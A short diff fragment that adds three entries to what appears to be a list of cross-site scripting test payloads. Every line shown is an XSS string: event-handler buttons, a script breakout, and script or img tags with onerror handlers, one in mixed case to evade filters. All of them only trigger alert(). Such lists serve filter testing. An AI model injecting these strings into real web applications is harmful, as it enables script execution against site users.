@@ -25,3 +25,6 @@
 '</img><button onmouseenter="alert('XSS')">Hover me! :D</button><img
 frame?timer=</div><button onmouseenter="alert(1)">Lol</button><div>
 ');alert(1)
+<script src="" onerror=alert(1)></script>
+/><img src="" onerror=alert(1)></script>
+/><ImG sRc="" onerror=alert('XSS')></ImG>
